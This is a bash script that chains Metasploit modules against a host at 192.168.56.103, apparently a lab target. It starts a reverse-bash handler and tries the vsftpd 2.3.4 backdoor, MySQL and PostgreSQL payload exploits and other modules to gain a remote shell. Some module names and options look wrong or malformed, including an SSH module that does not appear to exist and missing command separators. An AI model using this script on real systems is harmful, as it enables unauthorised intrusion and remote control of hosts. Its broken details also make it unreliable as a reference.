 #!/usr/bin/env bash                                                            
                                                                                
 # Define variables                                                             
 TARGET_IP="192.168.56.103"                                                      
 LHOST="192.168.56.101"                                                          
 LPORT="4444"                                                                   
 TIMESTAMP=$(date +"%Y%m%d_%H%M%S")                                             
 ARTIFACT_DIR="artifacts_$TIMESTAMP"                                            
                                                                                
 # Create artifact directory                                                    
 mkdir -p "$ARTIFACT_DIR"                                                       
                                                                                
 # Start Metasploit handler                                                     
 echo "[*] Starting Metasploit handler..."                                      
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_bash 
 set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j" &         
                                                                                
 # Exploit FTP vsftpd 2.3.4 backdoor                                            
 echo "[*] Attempting FTP vsftpd 2.3.4 backdoor exploit..."                     
 msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS         
 $TARGET_IP; set LHOST $LHOST; set LPORT $LPORT; run; exit" || {                
     echo "[!] FTP exploit failed, trying next vulnerability..."                
 }                                                                              
                                                                                
 # Exploit SSH OpenSSH 4.7p1                                                    
 echo "[*] Attempting SSH OpenSSH 4.7p1 exploit..."                             
 msfconsole -q -x "use exploit/linux/ssh/openssh_4.7p1; set RHOSTS $TARGET_IP;  
 set LHOST $LHOST; set LPORT $LPORT; run; exit" || {                            
     echo "[!] SSH exploit failed, trying next vulnerability..."                
 }                                                                              
                                                                                
 # Exploit HTTP Apache httpd 2.2.8                                              
 echo "[*] Attempting HTTP Apache httpd 2.2.8 exploit..."                       
 msfconsole -q -x "use auxiliary/dos/http/apache_mod_isapi; set RHOSTS          
 $TARGET_IP; run; exit" || {                                                    
     echo "[!] HTTP exploit failed, trying next vulnerability..."               
 }                                                                              
                                                                                
 # Exploit MySQL 5.0.51a-3ubuntu5                                               
 echo "[*] Attempting MySQL 5.0.51a-3ubuntu5 exploit..."                        
 msfconsole -q -x "use exploit/linux/mysql/mysql_payload; set RHOSTS $TARGET_IP 
 set LHOST $LHOST; set LPORT $LPORT; run; exit" || {                            
     echo "[!] MySQL exploit failed, trying next vulnerability..."              
 }                                                                              
                                                                                
 # Exploit PostgreSQL 8.3.0 - 8.3.7                                             
 echo "[*] Attempting PostgreSQL 8.3.0 - 8.3.7 exploit..."                      
 msfconsole -q -x "use exploit/linux/postgres/postgres_payload; set RHOSTS      
 $TARGET_IP; set LHOST $LHOST; set LPORT $LPORT; run; exit" || {                
     echo "[!] PostgreSQL exploit failed."                                      
 }                                                                              
                                                                                
 # Run proof commands if session is obtained                                    
 echo "[*] Running proof commands..."                                           
 echo "whoami" > "$ARTIFACT_DIR/proof_commands.txt"                             
 echo "id" >> "$ARTIFACT_DIR/proof_commands.txt"                                
 echo "uname -a" >> "$ARTIFACT_DIR/proof_commands.txt"                          
 echo "pwd" >> "$ARTIFACT_DIR/proof_commands.txt"                               
                                                                                
 # Check script syntax                                                          
 bash -n "$0" || shellcheck "$0"                                                
